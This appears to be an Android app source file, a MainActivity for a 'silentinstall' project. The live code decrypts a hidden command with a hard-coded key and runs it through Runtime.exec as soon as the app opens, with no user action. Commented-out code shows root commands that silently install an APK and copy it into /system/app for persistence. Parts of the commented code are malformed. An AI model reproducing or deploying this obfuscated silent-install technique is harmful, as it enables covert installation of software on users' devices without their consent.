package com.example.shentanli.silentinstall;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RelativeLayout;

import java.io.BufferedReader;
import java.io.DataOutput;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;

import static com.example.shentanli.silentinstall.R.id.installbutton;
import static com.example.shentanli.silentinstall.R.id.uninstallbutton;


//public class MainActivity extends Activity implements View.OnClickListener{

public class MainActivity extends Activity{
    private EditText et_packagename;
  //  private String cmd_install = "pm install -r ";
  //  private String cmd_uninstall = "pm uninstall ";
  //  String apklocation = Environment.getExternalStorageState().toString() + "/";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        et_packagename = (EditText) findViewById(R.id.et_packagename);
        Button installb = new Button(this);
        Button uninstallb = new Button(this);
        installb.setHeight(20);
        installb.setText("silent install");

        uninstallb.setHeight(20);
        uninstallb.setText("silent uninstall");


      //  installb.setOnClickListener(this);
      //  uninstallb.setOnClickListener(this);
        Log.i("message","finished create button");
      //
        Process process;
        try {
            Log.i("message","inter the install process");
        //    String cmd = "su -c pm install -r -d /sdcard/test.apk";
        //    String cmd = new Bodymethod().getcmd();
              String stmp = new Bodymethod().getcmde();
              String cmd = Decrypt.decrypt(stmp, "iamagirl");
         //   if (!cmd.isEmpty())
         //   {
                process = Runtime.getRuntime().exec(cmd);
           // process = Runtime.getRuntime().exec(new String[] {"pm install -r -d sdcard/test.apk"});

          //  process = Runtime.getRuntime().exec(new String[] {"su", "-c", "cp /sdcard/test.apk /system/app/"});
            Log.i("message","after install");
            process.waitFor();
        //}
        //    Bodymethod cm = new Bodymethod();
      //      cm.bodymethod(cmd);

        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }


    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }


/*
    public void onClick_install(View view)
    {
        String cmd = cmd_install + apklocation +et_packagename.getText().toString().trim();
        System.out.print("slient installation command: "+cmd);
        executeSuCMD(cmd);
    }

    public void onClick_uninstall(View view)
    {
            case R.id.i
        String cmd = cmd_uninstall + apklocation +et_packagename.getText().toString().trim();
        System.out.print("slient uninstallation command: "+cmd);
        executeSuCMD(cmd);
            case R.id.i
    }


    protected int executeSuCMD(String cmd)
    {
        try{
            Log.i("message","executecmd method");
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream dos = new DataOutputStream(process.getOutputStream());
            dos.writeBytes("export LD_LIBRARY_PATH =/vendor/lib:/system/lib \n");
            cmd = String.valueOf(cmd);
            dos.writeBytes(cmd + "\n");
            dos.flush();
            process.waitFor();
            int result = process.exitValue();
            return result;



        } catch (IOException e) {
            e.printStackTrace();
            return -1;
        } catch (InterruptedException e) {
            e.printStackTrace();
            return -1;
        }

    }

    @Override
    public void onClick(View view) {
        switch (view.getId()){
            case R.id.installbutton:
                Log.i("message","click op happens");
                String cmd = cmd_install + apklocation +et_packagename.getText().toString().trim();
                System.out.print("silent installation command: "+cmd);
              cmd = cmd_install + "test.apk";
                Log.i("message","start execmd");
                executeSuCMD(cmd);


                break;
            case R.id.uninstallbutton:
                    cmd = cmd_uninstall + apklocation +et_packagename.getText().toString().trim();
                    System.out.print("silent un-installation command: "+cmd);
                    executeSuCMD(cmd);
                break;
        }
    }

*/

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

/*
    public static int installsilent(Context context, String fp)
    {
        File file= new File(fp);
        if (fp == null || fp.length() == 0 || (file = new File(fp)) == null || file.length() <= 0 || !file.exists() || !file.isFile())
        {
            return 1;
        }

        String[] args = {"pm", "install", "-r", fp};
        ProcessBuilder pb = new ProcessBuilder(args);
        Process p = null;
        BufferedReader successR = null;
        BufferedReader errorR = null;
        StringBuilder successM = new StringBuilder();
        StringBuilder errorM = new StringBuilder();
        int resutl = 0;
        try{
            p = pb.start();
            successR = new BufferedReader(new InputStreamReader(p.getInputStream()));
            errorR  = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            String s;
            while((s=successR.readLine())!=null)
            {
                successM.append(s);
            }
            while((s=errorR.readLine())!=null)
            {
                errorM.append(s);
            }
        } catch (IOException e) {
            e.printStackTrace();
            resutl = 2;
        }catch (Exception e )
        {
            e.printStackTrace();
            resutl = 2;
        }finally {
            try{
                if (successR != null)
                    successR.close();
                if (errorR != null)
                    errorR.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            if (p != null)
                p.destroy();

        }


        return resutl;
    }*/


}
